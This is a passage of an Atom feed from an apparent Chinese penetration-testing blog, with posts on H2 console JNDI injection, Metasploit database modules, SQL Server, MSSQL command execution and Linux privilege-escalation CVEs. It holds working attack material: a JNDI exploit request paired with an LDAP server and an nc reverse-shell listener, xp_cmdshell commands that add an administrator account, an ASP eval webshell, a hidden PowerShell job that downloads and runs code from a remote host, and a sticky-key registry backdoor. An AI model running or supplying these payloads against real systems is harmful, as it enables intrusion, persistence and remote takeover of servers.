+<p><code>spring</code> 配置中启用 <code>h2 console spring.h2.console.enabled=true</code></p>
+</li>
+<li>
+<p>目标可以请求攻击者的服务器（请求可出外网）</p>
+</li>
+<li>
+<p><code>JNDI</code> 注入受目标 <code>JDK</code> 版本影响，<code>jdk &lt; 6u201/7u191/8u182/11.0.1</code>（<code>LDAP</code> 方式）</p>
+</li>
+</ul>
+<h5 id="利用方法-10">利用方法：</h5>
+<h6 id="步骤一访问路由获得-jsessionid">步骤一：访问路由获得 jsessionid</h6>
+<p>直接访问目标开启 <code>h2 console</code> 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p>
+<h6 id="步骤二准备要执行的-java-代码-2">步骤二：准备要执行的 Java 代码</h6>
+<p>编写优化过后的用来反弹 <code>shell</code> 的 <code>Java</code> 示例代码 <code>JNDIObject.java</code>，</p>
+<p>使用兼容低版本 <code>jdk</code> 的方式编译：</p>
+<pre><code>javac -source 1.5 -target 1.5 JNDIObject.java
+</code></pre>
+<p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
+<h6 id="步骤三托管-class-文件-2">步骤三：托管 class 文件</h6>
+<p>在自己控制的 <code>vps</code> 机器上开启一个简单 <code>HTTP</code> 服务器，端口尽量使用常见 <code>HTTP</code> 服务端口（<code>80</code>、<code>443</code>）</p>
+<pre><code># 使用 python 快速开启 http server
+
+python2 -m SimpleHTTPServer 80
+python3 -m http.server 80
+</code></pre>
+<p>将步骤二中编译好的 <code>class</code> 文件拷贝到 <code>HTTP</code> 服务器根目录。</p>
+<h6 id="步骤四架设恶意-ldap-服务-2">步骤四：架设恶意 ldap 服务</h6>
+<p>下载 <code>marshalsec</code> ，使用下面命令架设对应的 <code>ldap</code> 服务：</p>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
+</code></pre>
+<h6 id="步骤五监听反弹-shell-的端口-3">步骤五：监听反弹 shell 的端口</h6>
+<p>一般使用 <code>nc</code> 监听端口，等待反弹 <code>shell</code></p>
+<pre><code>nc -lv 443
+</code></pre>
+<h6 id="步骤六发包触发-jndi-注入">步骤六：发包触发 JNDI 注入</h6>
+<p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>ldap://your-vps-ip:1389/JNDIObject</code></p>
+<pre><code>POST /h2-console/login.do?jsessionid=xxxxxx
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx
+
+language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=ldap://your-vps-ip:1389/JNDIObject&amp;user=&amp;password=
+</code></pre>
+<h5 id="漏洞分析-7">漏洞分析：</h5>
+<p>https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&amp;mid=2247483658&amp;idx=1&amp;sn=584710da0fbe56c1246755147bcec48e&amp;scene=21#wechat_redirect</p>
+<h5 id="漏洞环境-7">漏洞环境：</h5>
+<pre><code>repository/springboot-h2-database-rce
+</code></pre>
+<p>正常访问：</p>
+<pre><code>http://127.0.0.1:9096/h2-console
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[数据库攻击]]></title>
+        <id>https://piaogexu.github.io/post/shu-ju-ku-gong-ji/</id>
+        <link href="https://piaogexu.github.io/post/shu-ju-ku-gong-ji/">
+        </link>
+        <updated>2020-11-28T07:19:35.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="mysql服务攻击">mysql服务攻击</h3>
+<p>关于msf常用攻击mysql插件如下：</p>
+<pre><code>1. auxiliary/scanner/mysql/mysql_login
+2. exploit/multi/mysql/mysql_udf_payload
+3. exploit/windows/mysql/mysql_mof
+4. exploit/windows/mysql/scrutinizer_upload_exec
+5. auxiliary/scanner/mysql/mysql_hashdump
+6. auxiliary/admin/mysql/mysql_sql
+7. auxiliary/scanner/mysql/mysql_version
+</code></pre>
+<h4 id="1-auxiliaryscannermysqlmysql_login">1、auxiliary/scanner/mysql/mysql_login</h4>
+<p>常用于内网中的批量以及单主机的登录测试。</p>
+<h4 id="2-exploitmultimysqlmysql_udf_payload">2、exploit/multi/mysql/mysql_udf_payload</h4>
+<p>常用于root启动的mysql 并root的udf提权。</p>
+<h4 id="3-exploitwindowsmysqlmysql_mof">3、exploit/windows/mysql/mysql_mof</h4>
+<p>mof提权</p>
+<h4 id="4-exploitwindowsmysqlscrutinizer_upload_exec">4、exploit/windows/mysql/scrutinizer_upload_exec</h4>
+<p>上传文件执行。</p>
+<h4 id="5-auxiliaryscannermysqlmysql_hashdump">5、auxiliary/scanner/mysql/mysql_hashdump</h4>
+<p>mysql的mysql.user表的hash</p>
+<p>而在实战中，mysql_hashdump这个插件相对其他较为少用。一般情况建议使用sql语句： 更直观，更定制化</p>
+<h4 id="6-auxiliaryadminmysqlmysql_sql">6、auxiliary/admin/mysql/mysql_sql</h4>
+<p>执行sql语句。尤其是在目标机没有web界面等无法用脚本执行的环境。</p>
+<h4 id="7-auxiliaryscannermysqlmysql_version">7、auxiliary/scanner/mysql/mysql_version</h4>
+<p>常用于内网中的批量mysql主机发现。</p>
+<h3 id="攻击sql-server-服务">攻击sql server 服务</h3>
+<p>msf 内置关于 mssql 插件如下（部分非测试mssql 插件）</p>
+<p>关于msf常用攻击mssql插件如下：</p>
+<pre><code>1. auxiliary/admin/mssql/mssql_enum
+2. auxiliary/admin/mssql/mssql_enum_sql_logins
+3. auxiliary/admin/mssql/mssql_escalate_dbowner
+4. auxiliary/admin/mssql/mssql_exec
+5. auxiliary/admin/mssql/mssql_sql
+6. auxiliary/admin/mssql/mssql_sql_file
+7. auxiliary/scanner/mssql/mssql_hashdump
+8. auxiliary/scanner/mssql/mssql_login
+9. auxiliary/scanner/mssql/mssql_ping
+10. exploit/windows/mssql/mssql_payload
+11. post/windows/manage/mssql_local_auth_bypass
+</code></pre>
+<h4 id="1-auxiliaryadminmssqlmssql_enum">1. auxiliary/admin/mssql/mssql_enum</h4>
+<p>非常详细的目标机Sql server 信息。</p>
+<h4 id="2auxiliaryadminmssqlmssql_enum_sql_logins">2.auxiliary/admin/mssql/mssql_enum_sql_logins</h4>
+<p>枚举sql logins，速度较慢，不建议使用。</p>
+<h4 id="3auxiliaryadminmssqlmssql_escalate_dbowner">3.auxiliary/admin/mssql/mssql_escalate_dbowner</h4>
+<p>发现dbowner，当sa无法得知密码的时候，或者需要其他账号提供来支撑下一步的内网渗透。</p>
+<h4 id="4auxiliaryadminmssqlmssql_exec">4.auxiliary/admin/mssql/mssql_exec</h4>
+<p>最常用模块之一，当没有激活xp_cmdshell，自动激活。并且调用执行cmd命令。权限继承 Sql server。</p>
+<h4 id="5auxiliaryadminmssqlmssql_sql">5.auxiliary/admin/mssql/mssql_sql</h4>
+<p>最常用模块之一，如果熟悉Sql server 数据库特性，以及sql语句。建议该模块，更稳定。</p>
+<h4 id="6auxiliaryadminmssqlmssql_sql_file">6.auxiliary/admin/mssql/mssql_sql_file</h4>
+<p>当需要执行多条sql语句的时候，或者非常复杂。msf本身支持执行sql文件。授权渗透应用较少，非授权应用较多的模块。</p>
+<h4 id="7auxiliaryscannermssqlmssql_hashdump">7.auxiliary/scanner/mssql/mssql_hashdump</h4>
+<p>mssql的hash导出。如果熟悉sql语句。也可以用mssql_sql模块来执行。</p>
+<h4 id="8auxiliaryscannermssqlmssql_login">8.auxiliary/scanner/mssql/mssql_login</h4>
+<p>内网渗透中的常用模块之一，支持RHOSTS，来批量发现内网mssql主机。mssql的特性除了此种方法。还有其他方法来专门针对mssql主机发现，以后得季会提到。</p>
+<h4 id="9auxiliaryscannermssqlmssql_ping">9.auxiliary/scanner/mssql/mssql_ping</h4>
+<p>查询mssql 实例，实战中，应用较少。信息可能不准确。</p>
+<h4 id="10exploitwindowsmssqlmssql_payload">10.exploit/windows/mssql/mssql_payload</h4>
+<p>非常好的模块之一，在实战中。针对不同时间版本的系统都有着自己独特的方式来上传payload。</p>
+<h4 id="11postwindowsmanagemssql_local_auth_bypass">11.post/windows/manage/mssql_local_auth_bypass</h4>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[mssql学习]]></title>
+        <id>https://piaogexu.github.io/post/mssql-xue-xi/</id>
+        <link href="https://piaogexu.github.io/post/mssql-xue-xi/">
+        </link>
+        <updated>2020-11-28T07:19:22.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="sql-sever-系统数据库">SQL Sever 系统数据库</h4>
+<p><strong>在我们安装 <code>SQL Server</code> 的时候，会自动创建下面的五个数据库。</strong></p>
+<ul>
+<li>
+<p><code>master</code>：记录了SQL <code>SERVER</code>实例的所有系统级消息，包括实例范围的元数据（如登录帐号）、端点、链接服务器和系统配置设置。</p>
+</li>
+<li>
+<p><code>msdb</code>：供<code>SQL SERVER</code> 代理服务调度报警和作业以及记录操作员的使用，保存关于调度报警、作业、操作员等信息。（备份还原时）</p>
+</li>
+<li>
+<p><code>model</code>：<code>SQL SERVER</code> 实例上创建的所有数据库的模板。</p>
+</li>
+<li>
+<p><code>tempdb</code>：临时数据库，用于保存临时对象或中间结果集，为数据库的排列等操作提供一个临时工作空间。（每次启动都会重新创建）</p>
+</li>
+<li>
+<p><code>Resource</code>：一个只读数据库，包含了<code>SQL SERVER</code> 的所有系统对象。（隐藏的数据库）</p>
+</li>
+</ul>
+<h4 id="数据库的组成">数据库的组成</h4>
+<p><strong>数据文件</strong></p>
+<ol>
+<li>主要数据文件：扩展名为<code>.mdf</code>，每个数据库有且只能有一个。</li>
+<li>次要数据文件：扩展名为 <code>.ndf</code> ， 可以没有或有多个。</li>
+</ol>
+<p><strong>日志文件</strong></p>
+<p>扩展名为<code>.ldf</code>，用于存放恢复数据库的所有日志信息。</p>
+<p><strong>数据的存储分配</strong></p>
+<ol>
+<li>
+<p>数据文件和日志文件的默认存放位置为：<code>\Programe Files\Microsoft SQL Server\MSSQL.1\MSSQL\Data</code>文件夹。</p>
+</li>
+<li>
+<p>数据的存储分配单位是数据页。一页表是一块8KB的连续磁盘空间。</p>
+</li>
+<li>
+<p>页是存储数据的最小空间分配单位，页的大小决定了数据库表中一行数据的最大大小。</p>
+</li>
+</ol>
+<h4 id="sql-server存储过程">SQL Server存储过程</h4>
+<p><code>SQL Server</code> 中视图通过简单的 <code>SELECT</code> 查询来解决复杂的查询，但是视图不能提供业务逻辑功能，而存储过程可以办到这点。</p>
+<p>存储过程 <code>Procedure</code> 是一组为了完成特定功能的 <code>SQL</code> 语句集合，经编译后存储在数据库中，用户通过指定存储过程的名称并给出参数来执行。</p>
+<p>存储过程中可以包含逻辑控制语句和数据操纵语句，它可以接受参数、输出参数、返回单个或多个结果集以及返回值。</p>
+<p>由于存储过程在创建时即在数据库服务器上进行了编译并存储在数据库中，所以存储过程运行要比单个的 <code>SQL</code> 语句块要快。同时由于在调用时只需用提供存储过程名和必要的参数信息，所以在一定程度上也可以减少网络流量、简单网络负担。</p>
+<h5 id="存储过程的优点">存储过程的优点</h5>
+<p>下面是一些在使用存储过程的主要优点：</p>
+<ul>
+<li>存储过程允许标准组件式编程<br>
+存储过程创建后可以在程序中被多次调用执行，而不必重新编写该存储过程的SQL语句。而且数据库专业人员可以随时对存储过程进行修改，但对应用程序源代码却毫无影响，从而极大的提高了程序的可移植性。</li>
+<li>存储过程能够实现较快的执行速度 如果某一操作包含大量的T-SQL语句代码，分别被多次执行，那么存储过程要比批处理的执行速度快得多。因为存储过程是预编译的，在首次运行一个存储过程时，查询优化器对其进行分析、优化，并给出最终被存在系统表中的存储计划。而批处理的T-SQL语句每次运行都需要预编译和优化，所以速度就要慢一些。</li>
+<li>存储过程减轻网络流量 对于同一个针对数据库对象的操作，如果这一操作所涉及到的T-SQL语句被组织成一存储过程，那么当在客户机上调用该存储过程时，网络中传递的只是该调用语句，否则将会是多条SQL语句。从而减轻了网络流量，降低了网络负载。</li>
+<li>存储过程可被作为一种安全机制来充分利用<br>
+系统管理员可以对执行的某一个存储过程进行权限限制，从而能够实现对某些数据访问的限制，避免非授权用户对数据的访问，保证数据的安全。</li>
+</ul>
+<h5 id="sql-server-创建一个存储过程">SQL Server 创建一个存储过程</h5>
+<p>我们需要使用 <code>CREATE PROCEDURE</code> 语句创建一个存储过程，接着要补充存储过程的代码，如果存储过程将要接受参数，它们需要被包括在名称后，如下:</p>
+<pre><code>CREATE PROCEDURE myStoredProcedure AS
+...
+
+OR
+
+CREATE PROCEDURE myStoredProcedure @{Parameter Name} {data type} AS
+...
+</code></pre>
+<p><strong>实例</strong><br>
+下述代码创建了一个被称为 <code>“LatestTasks”</code> 的存储过程。</p>
+<p>它接受一个参数名为 <code>@Count</code>. 当调用这个存储过程，通过 <code>@count</code> 参数，它决定你想要多少行返回。</p>
+<p>代码如下：</p>
+<pre><code>CREATE PROCEDURE LatestTasks @Count int AS
+SET ROWCOUNT @Count
+SELECT TaskName AS LatestTasks, DateCreated
+FROM Tasks
+ORDER BY DateCreated DESC
+</code></pre>
+<h5 id="sql-server-执行存储过程">SQL Server 执行存储过程</h5>
+<p>常用系统存储过程有：</p>
+<pre><code>exec sp_databases; --查看数据库
+exec sp_tables;        --查看表
+exec sp_columns student;--查看列
+exec sp_helpIndex student;--查看索引
+exec sp_helpConstraint student;--约束
+exec sp_stored_procedures;
+exec sp_helptext 'sp_stored_procedures';--查看存储过程创建、定义语句
+exec sp_rename student, stuInfo;--修改表、索引、列的名称
+exec sp_renamedb myTempDB, myDB;--更改数据库名称
+exec sp_defaultdb 'master', 'myDB';--更改登录名的默认数据库
+exec sp_helpdb;--数据库帮助，查询数据库信息
+exec sp_helpdb master;
+</code></pre>
+<p>系统存储过程示例：</p>
+<pre><code>--表重命名
+exec sp_rename 'stu', 'stud';
+select * from stud;
+--列重命名
+exec sp_rename 'stud.name', 'sName', 'column';
+exec sp_help 'stud';
+--重命名索引
+exec sp_rename N'student.idx_cid', N'idx_cidd', N'index';
+exec sp_help 'student';
+--查询所有存储过程
+select * from sys.objects where type = 'P';
+select * from sys.objects where type_desc like '%pro%' and name like 'sp%';
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[sqlserver渗透]]></title>
+        <id>https://piaogexu.github.io/post/sqlserver-shen-tou/</id>
+        <link href="https://piaogexu.github.io/post/sqlserver-shen-tou/">
+        </link>
+        <updated>2020-11-28T07:19:12.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="1-sql-server渗透测试方法">1、SQL server渗透测试方法</h3>
+<h4 id="1-sa用户空弱口令的利用">1、SA用户空/弱口令的利用</h4>
+<p>1.默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）、（ms-sql-hidden    2433/tcp）</p>
+<p>2.弱口令</p>
+<p>Msf或者Scansql扫描器扫描SA用户空／弱口令，弱口令获得之后运用<code>SQLtools</code>或者<code>sql server</code>分析器等进行连接，然后进行上传、查询和执行相关操作。</p>
+<p>以SA用户通过<code>SQL Server</code>的查询分析器连接数据库服务器，以手工方式执行各种存储过程和相关命令，包括：</p>
+<p>l）使用<code>xp_cmdshell</code>扩展存储过程执行操作系统的命令；</p>
+<p>2）利用<code>xp_regread</code>扩展存储过程去读注册表的键值，当然包括SAM键；</p>
+<p>3）使用“<code>bulk insert</code>”语法去读服务器上的任意文件；</p>
+<p>4）使用<code>sp_OACreate</code>、<code>sp_OAMethod</code>和<code>sp_OAGetProperty</code>系统存储过程去创建ActiveX应用程序等</p>
+<p>（1）<code>Sql server</code>可利用<code>xp_cmdshell</code>进行提权。再通过管理工具连接后：</p>
+<ul>
+<li>查询框输入一下语句来查看数据库信息和系统版本：</li>
+</ul>
+<pre><code>select @@version
+</code></pre>
+<ul>
+<li>验证是否为sa权限：</li>
+</ul>
+<pre><code>select IS_SRVROLEMEMBER('sysadmin')
+</code></pre>
+<p>返回1，说明是sa权限，可执行sql语句。</p>
+<ul>
+<li>判断目标机的MSSQL服务是否存在<code>xp_cmdshell</code>扩展存储过程：</li>
+</ul>
+<pre><code>select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';
+
+
+xtype可以是下列对象类型中的一种： 
+C = CHECK 约束　　D = 默认值或 DEFAULT 约束　　F = FOREIGN KEY 约束　　L = 日志　　FN = 标量函数 
+IF = 内嵌表函数 　　P = 存储过程 　　PK = PRIMARY KEY 约束（类型是 K） 　　RF = 复制筛选存储过程
+ S = 系统表 　　TF = 表函数 　　TR = 触发器 　　U = 用户表 　　UQ = UNIQUE 约束（类型是 K） 
+V = 视图 　　X = 扩展存储过程
+</code></pre>
+<p>只要返回结果不是<code>0</code>就说明存在<code>xp_cmdshell</code>扩展存储过程。</p>
+<pre><code>注：
+
+1、前提
+    1）getshell或者存在sql注入并且能够执行命令。
+    2）sql server是system权限，sql server默认就是system权限
+2、xp_cmdshell
+    有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。
+    1）开启xp_cmdshell
+        exec sp_configure 'show advanced options', 1;reconfigure;
+        exec sp_configure 'xp_cmdshell',1;reconfigure;
+    2)关闭xp_cmdshell
+        exec sp_configure 'show advanced options', 1;reconfigure;
+        exec sp_configure 'xp_cmdshell', 0;reconfigure
+3、提权
+    exec master..xp_cmdshell 'net user test pinohd123. /add'    添加用户test，密码test
+    exec master..xp_cmdshell 'net localgroup administrators test add'    添加test用户到管理员组
+</code></pre>
+<p>然后运用<code>xp_cmdshell</code>执行sql查询：</p>
+<pre><code>Exec master..xp_cmdshell 'whoami';
+</code></pre>
+<p>命令并没有执行成功，得到了如下错误信息：</p>
+<p><code>Error Message:SQL Server</code> 阻止了对组件 <code>xp_cmdshell</code> 的 过程<code>sys.xp_cmdshell</code> 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 <code>sp_configure</code> 启用 <code>xp_cmdshell</code>。有关启用 <code>xp_cmdshell</code> 的详细信息，请参阅 SQL Server 联机丛书中的 &quot;外围应用配置器&quot;。</p>
+<p>我们从报错信息可以得出，<code>xp_cmdshell</code>扩展存储过程没被删除，只是禁止访问。于是我们就可以通过SQL语句启用它（用分号分割多语句）</p>
+<pre><code>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+</code></pre>
+<p>返回信息，启动成功。</p>
+<p>配置选项<code>show advanced options</code> 已从 0 更改为 1。请运行 <code>RECONFIGURE</code>语句进行安装。</p>
+<p>配置选项 <code>xp_cmdshell</code> 已从 0 更改为 1。请运行 <code>RECONFIGURE</code> 语句进行安装。</p>
+<p>再执行相关语句：<code>Exec master..xp_cmdshell 'whoami';</code></p>
+<p>返回当前用户。</p>
+<pre><code>注：
+xp_cmdshell 被删除可采用xplog70.dll恢复
+
+Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'
+</code></pre>
+<p>（2）Sql server 写入webshell</p>
+<p>通过<code>sp_makewebtask</code>和<code>xp_cmdshell</code>写入<code>shell</code>。第一个测试没成功，显示：找不到存储过程 <code>sp_makewebtask</code>。</p>
+<p>xp_cmdshell写入：</p>
+<pre><code>exec master..xp_cmdshell 'echo ^&lt;%eval request(&quot;pass&quot;)%^&gt; &gt;c:\java\update.asp'—
+</code></pre>
+<p>type查看：</p>
+<pre><code>exec master..xp_cmdshell 'type c:\java\update.asp'—
+</code></pre>
+<h3 id="mssql执行命令总结">MSSQL执行命令总结</h3>
+<h4 id="方法一xp_cmdshell">方法一：xp_cmdshell</h4>
+<pre><code>exec master..xp_cmdshell &quot;whoami&quot;默认执行是关闭
+
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+</code></pre>
+<p>将1修改为0则为关闭</p>
+<p>xp_cmdshell 被删除可采用xplog70.dll恢复</p>
+<pre><code>Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'
+</code></pre>
+<h4 id="方法二sp_oacreate">方法二：SP_OACREATE</h4>
+<p><code>xp_cmdshell</code> 删除以后，可以使用<code>SP_OACreate</code>。</p>
+<pre><code>EXEC sp_configure 'show advanced options', 1;   
+
+RECONFIGURE WITH OVERRIDE; 
+
+EXEC sp_configure 'Ole Automation Procedures', 1; 
+
+RECONFIGURE WITH OVERRIDE;   
+
+EXEC sp_configure 'show advanced options', 0;
+</code></pre>
+<p>执行[此方法无回显]</p>
+<pre><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;d:\\temp\\1.txt'
+</code></pre>
+<h4 id="方法三通过沙盒执行命令">方法三:通过沙盒执行命令</h4>
+<p>开启沙盒</p>
+<pre><code>exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+</code></pre>
+<p>利用jet.oledb执行命令</p>
+<pre><code>select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\dnary.mdb','select shell(&quot;whoami&quot;)')
+
+select * from openrowset('microsoft.jet.oledb.4.0',';database=ias\ias.mdb','select shell(&quot;CMD命令&quot;)')
+</code></pre>
+<p>但是,当 c:\Windows\System32\ias\dnary.mdb 或 c:\Windows\System32\ias\ias.mdb 被删除时,命令就会无效了.</p>
+<p>所以利用以下语句创建一个数据库：(数据库名SysSetup.xml,后缀.xml是自定义,不影响使用.)</p>
+<pre><code>declare @hr int
+
+declare @object int;declare @property int
+
+exec @hr = sp_OACreate 'ADOX.Catalog',@object OUTPUT
+
+exec @hr = sp_OAMethod @object,'Create',@property output,'Provider=Microsoft.Jet.OLEDB.4.0;Data Source=SysSetup.xml'
+</code></pre>
+<p>然后再利用jet.oledb调用SysSetup.xml执行系统命令：</p>
+<pre><code>select * from openrowset('microsoft.jet.oledb.4.0',';database=SysSetup.xml','select shell(&quot;CMD命令&quot;)')
+</code></pre>
+<h4 id="方法四通过agent-job执行命令">方法四:通过Agent Job执行命令</h4>
+<p>修改开启Ageent Job，执行无回显CobaltStrike生成powershell上线</p>
+<pre><code>USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(''http://192.168.214.129:80/a''))&quot;', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1';
+</code></pre>
+<h4 id="方法五1433映像劫持后门提权">方法五：1433映像劫持后门提权</h4>
+<p>首先:</p>
+<p>1.服务器开启了终端端口(终端端口未必是3389,可以自行查询)</p>
+<p>2.服务器的粘滞键功能无损,只要可以正常弹出即可</p>
+<p>3.服务器未禁止注册表编辑(即写入功能)</p>
+<p>sql命令读取服务器终端端口:</p>
+<pre><code>exec master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-
+Tcp','PortNumber'
+</code></pre>
+<p>1.sql命令查询注册表粘滞键是否被劫持</p>
+<pre><code>exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
+</code></pre>
+<p>2.sql命令劫持注册表粘滞键功能,替换成任务管理器(当然你也可以替换成你想要的其他命令)</p>
+<pre><code>xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe',
+'Debugger','REG_SZ','C:\WINDOWS\system32\taskmgr.exe'
+</code></pre>
+<p>3.sql命令删除注册表粘滞键的劫持功能保护你的服务器不再被他人利用</p>
+<pre><code> xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'
+</code></pre>
+<h3 id="3-sql-server-常用操作远程桌面语句">3、sql server 常用操作远程桌面语句</h3>
+<h4 id="1-是否开启远程桌面">1、是否开启远程桌面</h4>
+<ul>
+<li>1：表示关闭</li>
+<li>0：表示开启</li>
+</ul>
+<p>查询语句：</p>
+<pre><code>EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\Terminal Server',
+'fDenyTSConnections'
+</code></pre>
+<h4 id="2-读取远程桌面的端口">2、读取远程桌面的端口</h4>
+<p>语句：</p>
+<pre><code>EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp',
+'PortNumber'
+</code></pre>
+<h4 id="3-开启远程桌面">3、开启远程桌面</h4>
+<pre><code>EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\TerminalServer',
+'fDenyTSConnections','REG_DWORD',0;
+</code></pre>
+<p>reg 文件开启远程桌面：</p>
+<pre><code>Windows Registry Editor Version 5.00HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer]
+&quot;fDenyTSConnections&quot;=dword:00000000[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp]
+&quot;PortNumber&quot;=dword:00000d3d
+</code></pre>
+<p>//// 保存 micropoor.reg，并执行 regedit /s micropoor.reg</p>
+<p>注：如果第一次开启远程桌面，部分需要配置防火墙规则允许远程端口。</p>
+<pre><code>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP
+dir=in localport=3389 action=allow
+</code></pre>
+<h4 id="4-关闭远程桌面">4、关闭远程桌面</h4>
+<pre><code>EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\TerminalServer',
+'fDenyTSConnections','REG_DWORD',1;
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[linux提权]]></title>
+        <id>https://piaogexu.github.io/post/linux-ti-quan/</id>
+        <link href="https://piaogexu.github.io/post/linux-ti-quan/">
+        </link>
+        <updated>2020-11-28T07:18:55.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="linux提权-依赖exp篇">Linux提权-依赖exp篇</h4>
+<h5 id="exp注">exp注：#####</h5>
+<pre><code>CVE-2017-1000367 [Sudo] (Sudo 1.8.6p7 - 1.8.20)
+CVE-2017-1000112 [a memory corruption due to UFO to non-UFO path switch]
+CVE-2017-7494 [Samba Remote execution] (Samba 3.5.0-4.6.4/4.5.10/4.4.14)
+CVE-2017-7308 [a signedness issue in AF_PACKET sockets] (Linux kernel through 4.10.6)
+CVE-2017-6074 [a double-free in DCCP protocol] (Linux kernel through 4.9.11)
+CVE-2017-5123 ['waitid()'] (Kernel 4.14.0-rc4+)
+CVE-2016-9793 [a signedness issue with SO_SNDBUFFORCE and SO_RCVBUFFORCE socket options]  (Linux kernel before 4.8.14)
+CVE-2016-5195 [Dirty cow] (Linux kernel&gt;2.6.22 (released in 2007))
+CVE-2016-2384 [a double-free in USB MIDI driver]  (Linux kernel before 4.5)
+CVE-2016-0728 [pp_key] (3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13,3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6,3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)
+CVE-2015-7547 [glibc getaddrinfo] (before Glibc 2.9)
+CVE-2015-1328 [overlayfs] (3.13, 3.16.0, 3.19.0)
+CVE-2014-5284 [OSSEC] (2.8)
+CVE-2014-4699 [ptrace] (before 3.15.4)
+CVE-2014-4014 [Local Privilege Escalation] (before 3.14.8)
+CVE-2014-3153 [futex]  (3.3.5 ,3.3.4 ,3.3.2 ,3.2.13 ,3.2.9 ,3.2.1 ,3.1.8 ,3.0.5 ,3.0.4 ,3.0.2 ,3.0.1 ,2.6.39 ,2.6.38 ,2.6.37 ,2.6.35 ,2.6.34 ,2.6.33 ,2.6.32 ,2.6.9 ,2.6.8,2.6.7 ,2.6.6 ,2.6.5 ,2.6.4 ,3.2.2 ,3.0.18 ,3.0 ,2.6.8.1)
+CVE-2014-0196 [rawmodePTY] (2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.14, 3.15)
+CVE-2014-0038 [timeoutpwn] (3.4, 3.5, 3.6, 3.7, 3.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)
